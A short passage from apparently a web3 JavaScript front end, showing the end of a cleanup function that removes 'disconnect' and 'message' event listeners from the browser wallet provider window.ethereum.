	window.ethereum.removeListener('disconnect', events.disconnect)
	window.ethereum.removeListener('message', events.message)
}
